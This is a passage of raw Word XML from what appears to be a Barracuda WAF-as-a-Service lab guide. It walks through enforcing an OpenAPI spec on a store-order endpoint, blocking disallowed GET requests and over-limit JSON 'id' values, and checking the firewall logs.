        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Save</w:t>
      </w:r>
      <w:r w:rsidR="00393AB4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40C2B840" w14:textId="0B65B363" w:rsidR="00393AB4" w:rsidRDefault="00393AB4" w:rsidP="00393AB4">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="4DC1EA76" wp14:editId="792C0CE3">
            <wp:extent cx="3013544" cy="3013544"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="623780352" name="Picture 62378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5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13544" cy="3013544"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="579F99F5" w14:textId="5881453C" w:rsidR="00E5206A" w:rsidRDefault="00E5206A" w:rsidP="00E5206A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="11CCC3B7" w14:textId="777D0258" w:rsidR="009F46F6" w:rsidRDefault="009F46F6">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A72A09F" w14:textId="77777777" w:rsidR="00393AB4" w:rsidRDefault="00393AB4" w:rsidP="00393AB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Verify the JSON Profile is </w:t>
      </w:r>
      <w:r w:rsidRPr="002D208D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="002D208D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002D208D">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/v3/store/order</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> as shown </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F1C8F3D" w14:textId="2BF647B3" w:rsidR="00010127" w:rsidRDefault="00393AB4" w:rsidP="00393AB4">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2229613D" wp14:editId="4619E7F8">
            <wp:extent cx="3016184" cy="1596976"/>
            <wp:effectExtent l="0" t="0" r="0" b="3810"/>
            <wp:docPr id="623780356" name="Picture 62378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56"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId79">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3016184" cy="1596976"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="69CE1F63" w14:textId="77777777" w:rsidR="002D208D" w:rsidRPr="00EE01D8" w:rsidRDefault="002D208D" w:rsidP="002D208D">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Wait a few minutes for WAF-as-a-Service to Update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75032962" w14:textId="77777777" w:rsidR="00E5206A" w:rsidRDefault="6C66B517" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">WAF-as-a-Service will </w:t>
      </w:r>
      <w:r w:rsidR="0001389B">
        <w:t xml:space="preserve">allow the </w:t>
      </w:r>
      <w:r w:rsidR="0001389B" w:rsidRPr="000F6BBC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidR="0001389B">
        <w:t xml:space="preserve"> Method</w:t>
      </w:r>
      <w:r w:rsidR="007D6471">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00E5206A">
        <w:t>because it is allowed in the API Spec</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01FC6DD6" w14:textId="686F48EC" w:rsidR="000F6BBC" w:rsidRPr="000F6BBC" w:rsidRDefault="00E5206A" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>WAF-as-a-Servi</w:t>
      </w:r>
      <w:r w:rsidR="0068507C">
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">e </w:t>
      </w:r>
      <w:r w:rsidR="0068507C">
        <w:t xml:space="preserve">will </w:t>
      </w:r>
      <w:r w:rsidR="007D6471">
        <w:t xml:space="preserve">not allow other HTTP methods such as </w:t>
      </w:r>
      <w:r w:rsidR="0001389B" w:rsidRPr="000F6BBC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r w:rsidR="0068507C">
        <w:t xml:space="preserve"> that are not in the API Spec</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4966B6B7" w14:textId="27DE8A93" w:rsidR="00A046AB" w:rsidRDefault="007B3BC3" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="000F6BBC">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="00A046AB" w:rsidRPr="00A046AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00A046AB" w:rsidRPr="00A046AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00A046AB" w:rsidRPr="00A046AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/v3/store/order</w:t>
      </w:r>
      <w:r w:rsidR="00A046AB">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DA5FB6">
        <w:t xml:space="preserve">by </w:t>
      </w:r>
      <w:r w:rsidR="00F81092" w:rsidRPr="005C7965">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t xml:space="preserve">manually </w:t>
      </w:r>
      <w:r w:rsidR="00DA5FB6" w:rsidRPr="005C7965">
        <w:rPr>
          <w:highlight w:val="yellow"/>
        </w:rPr>
        <w:t>typing in the URL in your address bar</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1638324B" w14:textId="06BA5690" w:rsidR="00662E89" w:rsidRPr="00A046AB" w:rsidRDefault="00662E89" w:rsidP="00A046AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve"> for example:  </w:t>
      </w:r>
      <w:hyperlink r:id="rId80" w:history="1">
        <w:r w:rsidR="00A046AB" w:rsidRPr="006B31C7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/api/v3/store/order</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="35978377" w14:textId="1D14994A" w:rsidR="00A046AB" w:rsidRPr="00A046AB" w:rsidRDefault="00A046AB" w:rsidP="00A046AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">Your browser will send a </w:t>
      </w:r>
      <w:r w:rsidRPr="00A046AB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>GET</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> Method by default, </w:t>
      </w:r>
      <w:r w:rsidRPr="005C7965">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>but this is not allowed per the API Spec</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A4978E9" w14:textId="1782CE5F" w:rsidR="00A046AB" w:rsidRPr="00DA5FB6" w:rsidRDefault="00A046AB" w:rsidP="00A046AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="32"/>
        </w:numPr>
      </w:pPr>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>WAF-as-a-Service will block this request</w:t>
      </w:r>
      <w:r w:rsidR="00F81092" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> because the only Method allowed is a </w:t>
      </w:r>
      <w:r w:rsidR="00F81092" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>POST</w:t>
      </w:r>
      <w:r w:rsidR="00DA5FB6">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5DEF1599" wp14:editId="0F26CC6A">
            <wp:extent cx="4771006" cy="1701439"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="623780361" name="Picture 62378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61"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId81">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="4771006" cy="1701439"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="76A08637" w14:textId="77777777" w:rsidR="00A046AB" w:rsidRDefault="00A046AB" w:rsidP="00A046AB">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="0"/>
        </w:numPr>
        <w:ind w:left="1440"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2000C168" w14:textId="611493EC" w:rsidR="00CD1316" w:rsidRDefault="00CD131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22BE371C" w14:textId="6A2337D6" w:rsidR="00AA69C3" w:rsidRDefault="00AA69C3" w:rsidP="005D423D">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="111" w:name="_Toc72791991"/>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>API JSON Key Protection</w:t>
      </w:r>
      <w:bookmarkEnd w:id="111"/>
    </w:p>
    <w:p w14:paraId="08CA97ED" w14:textId="2820E9EF" w:rsidR="00D7221E" w:rsidRDefault="00D7221E" w:rsidP="00D7221E">
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>OpenAPI</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve"> specification also defines the allowed datatypes and limits for each JSON Key.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6B1239" w14:textId="65CA10D0" w:rsidR="001516C4" w:rsidRDefault="009361B8" w:rsidP="00CD1316">
      <w:r>
        <w:t>Barracuda WAF-as-a-Service can constrain and enforce the datatypes, which we will do in this lesson.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FE362EC" w14:textId="43D54841" w:rsidR="001516C4" w:rsidRPr="001516C4" w:rsidRDefault="00E0791C" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Click the Pencil icon to edit the “</w:t>
      </w:r>
      <w:r w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>id</w:t>
      </w:r>
      <w:r>
        <w:t>” Key</w:t>
      </w:r>
      <w:r w:rsidR="00187D40">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00393AB4">
        <w:t xml:space="preserve">for the </w:t>
      </w:r>
      <w:r w:rsidR="00393AB4" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00393AB4" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>api</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00393AB4" w:rsidRPr="0696E29C">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>/v3/store/order</w:t>
      </w:r>
      <w:r w:rsidR="00393AB4">
        <w:t xml:space="preserve"> API endpoint</w:t>
      </w:r>
      <w:r w:rsidR="00187D40">
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="1F9B042A" wp14:editId="0821BADF">
            <wp:extent cx="3627347" cy="1650670"/>
            <wp:effectExtent l="0" t="0" r="0" b="6985"/>
            <wp:docPr id="623780355" name="Picture 62378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55"/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId82">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="3627347" cy="1650670"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="59B2F195" w14:textId="3BC86C65" w:rsidR="001516C4" w:rsidRPr="001516C4" w:rsidRDefault="001516C4" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Set the </w:t>
      </w:r>
      <w:r w:rsidRPr="001516C4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Max Length</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r w:rsidRPr="001516C4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Max Number Value</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to </w:t>
      </w:r>
      <w:r w:rsidRPr="001516C4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and click </w:t>
      </w:r>
      <w:r w:rsidRPr="001516C4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Save</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4981875D" w14:textId="77777777" w:rsidR="00473A43" w:rsidRDefault="002903C4" w:rsidP="002903C4">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="670DC313" wp14:editId="5FB2033B">
            <wp:extent cx="2662733" cy="2867558"/>
            <wp:effectExtent l="0" t="0" r="4445" b="9525"/>
            <wp:docPr id="623780357" name="Picture 62378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57"/>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62733" cy="2867558"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="201D140C" w14:textId="3DA74E13" w:rsidR="00473A43" w:rsidRPr="00473A43" w:rsidRDefault="00473A43" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="2"/>
        </w:numPr>
        <w:rPr>
          <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
          <w:color w:val="365F91" w:themeColor="accent1" w:themeShade="BF"/>
          <w:sz w:val="26"/>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t>Wait a few minutes for WAF-as-a-Service to Update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="110EE146" w14:textId="22CA6496" w:rsidR="001516C4" w:rsidRDefault="001516C4" w:rsidP="002903C4">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:eastAsia="Calibri" w:hAnsi="Calibri" w:cs="Calibri"/>
          <w:color w:val="000000" w:themeColor="text1"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BB75B38" w14:textId="091E0338" w:rsidR="00662E89" w:rsidRDefault="007B3BC3" w:rsidP="00662E89">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Browse to your </w:t>
      </w:r>
      <w:r w:rsidRPr="00435706">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>CNAME</w:t>
      </w:r>
      <w:r w:rsidR="00662E89">
        <w:t xml:space="preserve">, for example:  </w:t>
      </w:r>
      <w:hyperlink r:id="rId84" w:history="1">
        <w:r w:rsidR="00662E89" w:rsidRPr="006B31C7">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>http://app######.prod.cudawaas.com/</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6390D416" w14:textId="5BD8EB3D" w:rsidR="009E1A03" w:rsidRDefault="009E1A03" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Scroll down and click on </w:t>
      </w:r>
      <w:r w:rsidRPr="009E1A03">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Store/</w:t>
      </w:r>
      <w:r w:rsidR="0045117B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>O</w:t>
      </w:r>
      <w:r w:rsidRPr="009E1A03">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>rder</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AFD05D8" w14:textId="15DF8325" w:rsidR="009E1A03" w:rsidRPr="001516C4" w:rsidRDefault="009E1A03" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001516C4">
        <w:t xml:space="preserve">Click </w:t>
      </w:r>
      <w:r w:rsidRPr="001516C4">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Try it Out</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A987E50" w14:textId="3AB6D338" w:rsidR="00494991" w:rsidRDefault="00494991" w:rsidP="009E1A03">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6C5FA063" wp14:editId="00AD2AB9">
            <wp:extent cx="2772888" cy="149453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772888" cy="1494531"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="1432461B" w14:textId="752A542B" w:rsidR="009E1A03" w:rsidRDefault="009E1A03" w:rsidP="002D2B05">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t>Edit the Order ID to a large number such as 120</w:t>
      </w:r>
      <w:r w:rsidR="00326C89">
        <w:t>, then c</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">lick </w:t>
      </w:r>
      <w:r w:rsidRPr="00326C89">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Execute</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="141BD9F8" w14:textId="0BF5BA31" w:rsidR="00494991" w:rsidRDefault="008E2C76" w:rsidP="0045117B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="2CDA9868" wp14:editId="2CBD2BFE">
            <wp:extent cx="2695699" cy="194150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6">
                      <a:extLst>
                        <a:ext uri="{28A0092B-C50C-407E-A947-70E740481C1C}">
                          <a14:useLocalDpi xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" val="0"/>
                        </a:ext>
                      </a:extLst>
                    </a:blip>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="2695699" cy="1941503"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7666A877" w14:textId="77777777" w:rsidR="0045117B" w:rsidRDefault="009E1A03" w:rsidP="0045117B">
      <w:pPr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You will be blocked.  </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CF4981B" w14:textId="13A496AE" w:rsidR="009E1A03" w:rsidRDefault="009E1A03" w:rsidP="0045117B">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Check the </w:t>
      </w:r>
      <w:r w:rsidRPr="0045117B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Firewall Logs</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to verify the reason for blocking is </w:t>
      </w:r>
      <w:r w:rsidRPr="0045117B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">maximum number </w:t>
      </w:r>
      <w:r w:rsidR="0045117B" w:rsidRPr="0045117B">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>value exceeded</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35C13D55" w14:textId="0369E3F9" w:rsidR="00494991" w:rsidRPr="00EF320C" w:rsidRDefault="00196E86" w:rsidP="0045117B">
      <w:pPr>
        <w:ind w:left="720"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:color w:val="2B579A"/>
          <w:shd w:val="clear" w:color="auto" w:fill="E6E6E6"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="42916403" wp14:editId="4FDA2F99">
            <wp:extent cx="5646941" cy="1513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646941" cy="1513339"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B919555" w14:textId="77777777" w:rsidR="00557085" w:rsidRDefault="00557085">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C8193A8" w14:textId="413D83BD" w:rsidR="008A0072" w:rsidRDefault="008A0072" w:rsidP="00172641">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
